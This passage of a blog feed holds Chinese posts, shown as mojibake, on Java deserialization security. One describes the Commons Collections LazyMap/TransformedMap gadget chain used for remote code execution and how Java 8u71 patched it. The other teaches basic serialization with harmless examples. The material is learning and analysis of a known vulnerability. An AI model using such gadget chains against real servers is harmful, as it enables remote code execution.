class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311810087.png"></p><h3 id="2-3-é—®é¢˜"><a href="#2-3-é—®é¢˜" class="headerlink" title="2.3 é—®é¢˜"></a>2.3 é—®é¢˜</h3><ol><li>æœªæ‰§è¡Œåˆ° readObject å°±å¼¹å‡ºè®¡ç®—å™¨</li></ol><blockquote><p>ã€ŠJava å®‰å…¨æ¼«è°ˆã€‹</p><p>åœ¨ä½¿ç”¨Proxyä»£ç†äº†mapå¯¹è±¡åï¼Œæˆ‘ä»¬åœ¨ä»»ä½•åœ°æ–¹æ‰§è¡Œmapçš„æ–¹æ³•å°±ä¼šè§¦å‘Payloadå¼¹å‡ºè®¡ç®—å™¨ï¼Œæ‰€</p><p>ä»¥ï¼Œåœ¨æœ¬åœ°è°ƒè¯•ä»£ç çš„æ—¶å€™ï¼Œå› ä¸ºè°ƒè¯•å™¨ä¼šåœ¨ä¸‹é¢è°ƒç”¨ä¸€äº›toStringä¹‹ç±»çš„æ–¹æ³•ï¼Œå¯¼è‡´ä¸ç»æ„é—´è§¦å‘äº†</p><p>å‘½ä»¤ã€‚</p></blockquote><p>è§£å†³åŠæ³•æœ‰ ï¼š</p><p>è®¾ç½® - æ„å»ºã€æ‰§è¡Œã€éƒ¨ç½² - è°ƒè¯•å™¨ - æ•°æ®è§†å›¾ - Java</p><p>å…³é—­ï¼š</p><p>å¯ç”¨é›†åˆç±»çš„æ›¿ä»£è§†å›¾</p><p>å¯ç”¨â€™toStringOâ€™å¯¹è±¡è§†å›¾</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311810304.png"></p><h3 id="2-4-æ€»ç»“"><a href="#2-4-æ€»ç»“" class="headerlink" title="2.4 æ€»ç»“"></a>2.4 æ€»ç»“</h3><p>æ¼æ´åŸç†ï¼š</p><ul><li><code>LazyMap.decorate(Map, Transformer)</code> åŒ…è£…ä¸€ä¸ªåº•å±‚ Mapã€‚</li><li>å½“è°ƒç”¨ <code>get(key)</code> æ—¶ï¼Œå¦‚æœ <code>key</code> ä¸å­˜åœ¨ï¼Œå°±ä¼šè°ƒç”¨ <code>transformer.transform(key)</code> ç”Ÿæˆå€¼å¹¶è¿”å›</li></ul><p>åˆ©ç”¨é“¾ï¼š</p><p>AnnotationInvocationHandler.readObject</p><p>AnnotationInvocationHandler.invoke</p><p>memberValues.get</p><p>LazyMap.get</p><p>LazyMap.get.factor.<font style="color:rgb(44, 62, 80);">transform</font></p><p>ChainedTransformer.transform</p><p>ConstantTransformer.transform</p><p>InvokerTransformer.transform  </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311810272.png"></p><h1 id="æ¼æ´ä¿®å¤ï¼š"><a href="#æ¼æ´ä¿®å¤ï¼š" class="headerlink" title="æ¼æ´ä¿®å¤ï¼š"></a>æ¼æ´ä¿®å¤ï¼š</h1><h2 id="1ã€TransformedMap"><a href="#1ã€TransformedMap" class="headerlink" title="1ã€TransformedMap"></a>1ã€TransformedMap</h2><p>TransformedMap åœ¨ Java 8u71 ä»¥ä¸Šçš„ç‰ˆæœ¬å°±ä¸å¯ä»¥ä½¿ç”¨äº†ã€‚</p><p>é¦–å…ˆæ¢³ç†ä¸€ä¸‹ TransformedMap åˆ©ç”¨é“¾çš„é€»è¾‘ï¼š</p><p><code>TransformedMap.decorate</code> åŒ…è£…äº†ä¸€ä¸ª <code>Map</code>ï¼Œå¹¶è®¾ç½®äº†ä¸€ä¸ªæ¶æ„ <code>Transformer</code>ï¼Œ<code>TransformedMap</code> åœ¨è°ƒç”¨<code>Map.Entry.setValue</code> çš„æ—¶å€™ï¼Œä¼šè§¦å‘ <code>transformer.transform(value)</code>ï¼Œåœ¨ gadget é“¾é‡Œï¼Œåˆ©ç”¨ <code>AnnotationInvocationHandler</code> çš„ååºåˆ—åŒ–é€»è¾‘ï¼Œæœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>Map.Entry.setValue</code>ï¼Œè§¦å‘æ¶æ„ä»£ç ã€‚</p><p>è€Œåˆ©ç”¨ <code>AnnotationInvocationHandler</code> ä¸»è¦ç”¨çš„æ˜¯ <code>readObject</code>æ–¹æ³•çš„ååºåˆ—åŒ–æ“ä½œï¼Œ</p><ul><li>åœ¨  Java 8u71 ä¹‹å‰ï¼š</li></ul><p><code>readObject</code>æ–¹æ³•åœ¨ååºåˆ—åŒ–æ—¶ä¼šéå† <code>Map</code> ä¸­çš„ <code>entry</code>ï¼Œè°ƒç”¨ <code>entry.setValue()</code> æ¥è°ƒæ•´é”®å€¼ã€‚äºæ˜¯æ¶æ„çš„ <code>TransformedMap entry</code> ä¼šè¢«è°ƒç”¨ <code>setValue</code>ï¼Œä»è€Œæ‰§è¡Œ <code>transform()</code>ã€‚</p><ul><li>åœ¨ Java 8u71 ä¹‹åï¼š</li></ul><p><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311810069.png"></p><p> æ–°å»ºä¸€ä¸ª<code>LinkedHashMap</code>ï¼Œå¯¹å€¼çš„ä¿®æ­£ï¼Œæ”¹æˆäº† <code>value = new ...</code>ï¼Œè€Œä¸æ˜¯ç›´æ¥è°ƒç”¨<code>entry.setValue</code>ï¼Œåç»­çš„æ“ä½œéƒ½æ˜¯é’ˆå¯¹<code>LinkedHashMap</code>ã€‚è¿™æ ·ä¸€æ¥ï¼Œ<code>streamVals</code>å°±ä¸ä¼šå»è°ƒç”¨ <code>setValue</code>ï¼Œå®ƒåªæ˜¯ä½œä¸ºä¸€ä¸ªè¾“å…¥è¢«è¯»å–äº†ä¸€éï¼Œç„¶åå°±è¿›å…¥äº†<code>LinkedHashMap</code>ï¼Œä¸ä¼šè§¦å‘æ¶æ„æ–¹æ³•ã€‚</p><p>æ‰€ä»¥è¯´ï¼Œæ¼æ´çš„ä¿®å¤å’Œ <code>setValue</code>å…³ç³»ä¸å¤§ï¼Œ</p><blockquote><p>ã€ŠJava å®‰å…¨æ¼«è°ˆã€‹</p><p>å¯¹äºè¿™æ¬¡ä¿®æ”¹ï¼Œæœ‰äº›æ–‡ç« è¯´æ˜¯å› ä¸ºæ²¡æœ‰äº†setValueï¼Œå…¶å®åŸå› å’ŒsetValueå…³ç³»ä¸å¤§ã€‚æ”¹åŠ¨åï¼Œä¸å†ç›´æ¥</p><p>ä½¿ç”¨ååºåˆ—åŒ–å¾—åˆ°çš„Mapå¯¹è±¡ï¼Œè€Œæ˜¯æ–°å»ºäº†ä¸€ä¸ªLinkedHashMapå¯¹è±¡ï¼Œå¹¶å°†åŸæ¥çš„é”®å€¼æ·»åŠ è¿›å»ã€‚</p><p>æ‰€ä»¥ï¼Œåç»­å¯¹Mapçš„æ“ä½œéƒ½æ˜¯åŸºäºè¿™ä¸ªæ–°çš„LinkedHashMapå¯¹è±¡ï¼Œè€ŒåŸæ¥æˆ‘ä»¬ç²¾å¿ƒæ„é€ çš„Mapä¸å†æ‰§</p><p>è¡Œsetæˆ–putæ“ä½œï¼Œä¹Ÿå°±ä¸ä¼šè§¦å‘RCEäº†ã€‚</p></blockquote><h2 id="2ã€-LazyMap"><a href="#2ã€-LazyMap" class="headerlink" title="2ã€ LazyMap"></a>2ã€ LazyMap</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311810672.png"></p><p>åŸæ¥ <code>readObject</code> ä¼šé€šè¿‡ <code>memberValues.get(name)</code> æˆ–è€… <code>entry.setValue(...)</code> é—´æ¥è°ƒç”¨ <code>Map</code> çš„æŸ¥æ‰¾&#x2F;å†™å…¥æ–¹æ³•ï¼Œç°åœ¨æ”¹ä¸ºéå†ååºåˆ—åŒ–å‡ºæ¥çš„ <code>streamVals.entrySet()</code>ã€ç›´æ¥è¯»å– <code>entry.getValue()</code> å¹¶æŠŠå€¼å¤åˆ¶åˆ°ä¸€ä¸ªæ–°çš„ <code>LinkedHashMap</code>ï¼Œç„¶åç”¨ <code>Unsafe</code>  ç›´æ¥åœ¨å†…å­˜é‡ŒæŠŠå¯¹è±¡å­—æ®µçš„å¼•ç”¨ä¸€æ¬¡æ€§å†™å…¥  ã€‚è¿™æ ·å°±åˆ‡æ–­äº†è§¦å‘ LazyMap.transform çš„è·¯å¾„ã€‚  </p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java å­¦ä¹ </tag>
      
      <tag>CCé“¾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java ååºåˆ—åŒ–å­¦ä¹ </title>
    <link href="/2025/08/26/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/08/26/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-ååºåˆ—åŒ–"><a href="#Java-ååºåˆ—åŒ–" class="headerlink" title="Java ååºåˆ—åŒ–"></a>Java ååºåˆ—åŒ–</h1><h1 id="1ã€åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#1ã€åºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="1ã€åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>1ã€åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h1><h2 id="1-1-ä»€ä¹ˆæ˜¯åºåˆ—åŒ–-ååºåˆ—åŒ–"><a href="#1-1-ä»€ä¹ˆæ˜¯åºåˆ—åŒ–-ååºåˆ—åŒ–" class="headerlink" title="1.1 ä»€ä¹ˆæ˜¯åºåˆ—åŒ–&amp;ååºåˆ—åŒ–"></a>1.1 ä»€ä¹ˆæ˜¯åºåˆ—åŒ–&amp;ååºåˆ—åŒ–</h2><p>åºåˆ—åŒ–ï¼šå°†å†…å­˜ä¸­çš„å¯¹è±¡å‹ç¼©æˆå­—èŠ‚æµ<br>ååºåˆ—åŒ–ï¼šå°†å­—èŠ‚æµè½¬åŒ–æˆå†…å­˜ä¸­çš„å¯¹è±¡</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311749235.png"></p><h2 id="1-2-ä¸ºä»€ä¹ˆæœ‰åºåˆ—åŒ–æŠ€æœ¯"><a href="#1-2-ä¸ºä»€ä¹ˆæœ‰åºåˆ—åŒ–æŠ€æœ¯" class="headerlink" title="1.2 ä¸ºä»€ä¹ˆæœ‰åºåˆ—åŒ–æŠ€æœ¯"></a>1.2 ä¸ºä»€ä¹ˆæœ‰åºåˆ—åŒ–æŠ€æœ¯</h2><p>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„è®¾è®¡å°±æ˜¯ç”¨æ¥ä¼ è¾“æ•°æ®çš„ã€‚</p><p><strong>åº”ç”¨åœºæ™¯</strong><br>(1) æƒ³æŠŠå†…å­˜ä¸­çš„å¯¹è±¡ä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­æˆ–è€…æ˜¯æ•°æ®åº“å½“ä¸­ã€‚<br>(2) ç”¨å¥—æ¥å­—åœ¨ç½‘ç»œä¸Šä¼ è¾“å¯¹è±¡ã€‚<br>(3) é€šè¿‡RMIä¼ è¾“å¯¹è±¡çš„æ—¶å€™ã€‚</p><h2 id="1-3-å‡ ç§å¸¸è§çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–åè®®"><a href="#1-3-å‡ ç§å¸¸è§çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–åè®®" class="headerlink" title="1.3 å‡ ç§å¸¸è§çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–åè®®"></a>1.3 å‡ ç§å¸¸è§çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–åè®®</h2><ul><li>XML</li><li>SOAPï¼ˆSimple Object Access protocolï¼‰ æ˜¯ä¸€ç§è¢«å¹¿æ³›åº”ç”¨çš„ï¼ŒåŸºäº XML ä¸ºåºåˆ—åŒ–å’Œååºåˆ—åŒ–åè®®çš„ç»“æ„åŒ–æ¶ˆæ¯ä¼ é€’åè®®</li><li>JSONï¼ˆJavascript Object Notationï¼‰</li><li>Protobuf</li></ul><h2 id="1-4-åºåˆ—åŒ–å’Œååºåˆ—åŒ–å®ç°"><a href="#1-4-åºåˆ—åŒ–å’Œååºåˆ—åŒ–å®ç°" class="headerlink" title="1.4 åºåˆ—åŒ–å’Œååºåˆ—åŒ–å®ç°"></a>1.4 åºåˆ—åŒ–å’Œååºåˆ—åŒ–å®ç°</h2><p>ç®€å•åˆ†æ Java çš„å¯¹è±¡åºåˆ—åŒ–çš„ä¸åŒå†™æ³•ï¼š</p><p>ä¿©ç§å†™æ³•æœ¬è´¨ä¸Šéƒ½æ˜¯ Java çš„å¯¹è±¡åºåˆ—åŒ–ï¼Œä½†å®ƒä»¬åœ¨åº•å±‚çš„ IO æµä½¿ç”¨æ–¹å¼ä¸Šç•¥æœ‰ä¸åŒï¼š</p><p><strong>å†™æ³•ä¸€ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));<br></code></pre></td></tr></table></figure><p>ä¼ ç»Ÿçš„åŸºäºå­—èŠ‚æµçš„æ–‡ä»¶å†™å…¥æ–¹å¼ï¼šFileOutputStream(â€œser.binâ€)ï¼Œ åˆ›å»ºä¸€ä¸ª <code>FileOutputStream</code>ï¼Œè¡¨ç¤ºè¦å†™å…¥çš„ç›®æ ‡æ–‡ä»¶æ˜¯ <code>ser.bin</code></p><p>ç‰¹ç‚¹ï¼š</p><ul><li>ç®€å•ç›´æ¥ï¼Œå…¼å®¹æ€§å¾ˆå¥½ï¼ŒJava æ—©æœŸç‰ˆæœ¬å°±æœ‰ã€‚</li><li>å¯¹è·¯å¾„å’Œæ–‡ä»¶åä½¿ç”¨çš„æ˜¯ <strong>å­—ç¬¦ä¸²å½¢å¼</strong>ã€‚</li></ul><p><strong>å†™æ³•äºŒï¼šï¼ˆIDEAæ¨èï¼‰</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;)));<br></code></pre></td></tr></table></figure><p><code>**Paths.get(&quot;ser.bin&quot;)**</code></p><ul><li>ä½¿ç”¨ <code>java.nio.file.Path</code> æ¥è¡¨ç¤ºæ–‡ä»¶è·¯å¾„ï¼Œæ¯” <code>String</code> æ›´çµæ´»ã€å¯ç»„åˆã€‚</li><li>å¯ä»¥æ–¹ä¾¿åœ°å¤„ç†è·¨å¹³å°è·¯å¾„ï¼Œæ¯”å¦‚ <code>&quot;folder/subfolder/file.txt&quot;</code></li></ul><p><code>**Files.newOutputStream(path)**</code></p><ul><li>è¿”å›ä¸€ä¸ª <code>OutputStream</code>ï¼ŒåŠŸèƒ½ç±»ä¼¼ <code>FileOutputStream</code>ã€‚</li><li>åŸºäº NIOï¼ˆNew IOï¼‰åº“ï¼Œæä¾›æ›´å¤šæ–‡ä»¶æ“ä½œé€‰é¡¹ï¼Œ</li></ul><p>ç‰¹ç‚¹ï¼š</p><ul><li>æ›´ç°ä»£åŒ–çš„å†™æ³•ï¼Œçµæ´»æ€§é«˜ï¼Œæ”¯æŒ NIO çš„å„ç§ç‰¹æ€§ã€‚</li><li>æ›´é€‚åˆä¸ <code>Path</code>ã€<code>Files</code> API é…åˆï¼Œæ¯”å¦‚æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ã€åˆ›å»ºç›®å½•ç­‰ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-comment">//å®šä¹‰ä¸€ä¸ª Person ç±»ï¼Œå¹¶å£°æ˜å®ƒå®ç°äº† Serializable æ¥å£,è¿™æ · Person çš„å¯¹è±¡å°±å¯ä»¥è¢«åºåˆ—åŒ–</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-comment">//ç§æœ‰æˆå‘˜å˜é‡</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-comment">//æ— å‚æ„é€ </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;&#125;<br><br>    <span class="hljs-comment">//æœ‰å‚æ„é€ </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-comment">//é‡å†™ toString() æ–¹æ³•</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>        <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>        <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>        <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Serialization</span> &#123;<br><br>    <span class="hljs-comment">//å®šä¹‰ä¸€ä¸ªé™æ€æ–¹æ³• serialize(Object obj)ï¼Œæ¥æ”¶ä¸€ä¸ªå¯¹è±¡å¹¶æŠŠå®ƒåºåˆ—åŒ–åˆ°æ–‡ä»¶</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// ObjectOutputStreamï¼šåŒ…è£…æ–‡ä»¶è¾“å‡ºæµï¼Œä½¿å…¶æ”¯æŒå†™å¯¹è±¡</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<br>            <span class="hljs-comment">// Files.newOutputStream(...)ï¼šåˆ›å»ºä¸€ä¸ªè¾“å‡ºæµï¼Œå†™å…¥åˆ° ser.bin æ–‡ä»¶</span><br>            <span class="hljs-comment">// Paths.get(&quot;ser.bin&quot;)ï¼šå¾—åˆ°ä¸€ä¸ªè·¯å¾„å¯¹è±¡ï¼Œè¡¨ç¤ºå½“å‰é¡¹ç›®ç›®å½•ä¸‹çš„ ser.bin æ–‡ä»¶</span><br>            Files.newOutputStream(Paths.get(<span class="hljs-string">&quot;ser.bin&quot;</span>))<br>        );<br>        <span class="hljs-comment">//oos.writeObject(obj)ï¼šæŠŠä¼ å…¥çš„ obj å†™åˆ°æ–‡ä»¶é‡Œï¼ˆå‰ææ˜¯å¯¹è±¡å¿…é¡»å®ç° Serializable æ¥å£ï¼‰</span><br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-number">11</span>);<br>        System.out.println(person);<br>        <span class="hljs-comment">//æŠŠè¿™ä¸ª person å¯¹è±¡å†™å…¥ ser.bin æ–‡ä»¶</span><br>        serialize(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Unserialize</span> &#123;<br><br>    <span class="hljs-comment">//å®šä¹‰ä¸€ä¸ªé™æ€æ–¹æ³• unserializeï¼Œæ¥æ”¶åºåˆ—åŒ–åçš„äºŒè¿›åˆ¶æ–‡ä»¶</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//new ObjectInputStream(...)ï¼šåŒ…è£…æˆå¯¹è±¡è¾“å…¥æµï¼Œè¿™æ ·å¯ä»¥ç›´æ¥è¯»å–å¯¹è±¡</span><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<br>            <span class="hljs-comment">// Files.newInputStream(Paths.get(filename))ï¼šåˆ›å»ºä¸€ä¸ªè¾“å…¥æµï¼ŒæŒ‡å‘ filename æ–‡ä»¶</span><br>            Files.newInputStream(Paths.get(filename))<br>        );<br>        <span class="hljs-comment">//ois.readObject()ï¼šä»æ–‡ä»¶ä¸­è¯»å–å¯¹è±¡</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//è°ƒç”¨ unserialize(&quot;ser.bin&quot;)ï¼Œä» ser.bin æ–‡ä»¶é‡Œååºåˆ—åŒ–å¾—åˆ°ä¸€ä¸ªå¯¹è±¡ï¼Œå¼ºåˆ¶è½¬æ¢ä¸º Person ç±»å‹</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person) unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>        System.out.println(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><font style="color:#080808;background-color:#ffffff;">Serialization åˆ›å»º Person å¯¹è±¡å¹¶å°†å…¶åºåˆ—åŒ–ä¿å­˜åˆ°æ–‡ä»¶ ser.bin</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311749774.png"></p><p>ç”Ÿæˆçš„ <font style="color:#080808;background-color:#ffffff;"> ser.bin </font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311750280.png"></p><p><font style="color:#080808;background-color:#ffffff;">Unserialize  ä» ser.bin æ–‡ä»¶é‡Œæ¢å¤ï¼ˆååºåˆ—åŒ–ï¼‰ä¸€ä¸ªå¯¹è±¡  </font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311750920.png"></p><p><strong>æ€»çš„æ¥è¯´ï¼š</strong></p><p> åœ¨ <code>serialize</code> æ–¹æ³•ä¸­ï¼Œå…ˆé€šè¿‡è¾“å‡ºæµå¯¹è±¡ <code>new FileOutputStream(&quot;ser.bin&quot;)</code>ã€ç­‰ä»·äº <code>Files.newOutputStream(Paths.get(&quot;ser.bin&quot;))</code>ã€‘åˆ›å»ºæ–‡ä»¶è¾“å‡ºé€šé“ï¼Œç„¶åå°†è¾“å‡ºæµåŒ…è£…æˆ <code>ObjectOutputStream</code>ï¼Œå†è°ƒç”¨ <code>writeObject</code> æ–¹æ³•å°†å¯¹è±¡åºåˆ—åŒ–å¹¶å†™å…¥æ–‡ä»¶ã€‚</p><p> åœ¨ <code>unserialize</code> æ–¹æ³•ä¸­ï¼Œå…ˆé€šè¿‡è¾“å…¥æµå¯¹è±¡ <code>new FileInputStream(&quot;ser.bin&quot;)</code>ã€ç­‰ä»·äº <code>Files.newInputStream(Paths.get(&quot;ser.bin&quot;))</code>ã€‘åˆ›å»ºæ–‡ä»¶è¾“å…¥é€šé“ï¼Œç„¶åå°†è¾“å…¥æµåŒ…è£…æˆ <code>ObjectInputStream</code>ï¼Œå†è°ƒç”¨ <code>readObject</code> æ–¹æ³•å°†æ–‡ä»¶ä¸­çš„äºŒè¿›åˆ¶æ•°æ®è¯»å–å‡ºæ¥å¹¶ååºåˆ—åŒ–æˆå¯¹è±¡ã€‚  </p><h2 id="1-5-ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜ï¼Ÿ"><a href="#1-5-ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜ï¼Ÿ" class="headerlink" title="1.5 ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜ï¼Ÿ"></a>1.5 ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜ï¼Ÿ</h2><p>åªè¦æœåŠ¡ç«¯ååºåˆ—åŒ–æ•°æ®ï¼Œå®¢æˆ·ç«¯ä¼ é€’ç±»çš„readObjectä¸­ä»£ç ä¼šè‡ªåŠ¨æ‰§è¡Œï¼Œç»™äºˆæ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œä»£ç çš„èƒ½åŠ›ã€‚</p><ol><li><font style="color:rgb(51, 51, 51);">å…¥å£ç±»çš„</font><code>&lt;font style=&quot;color:rgb(51, 51, 51);background-color:rgb(243, 244, 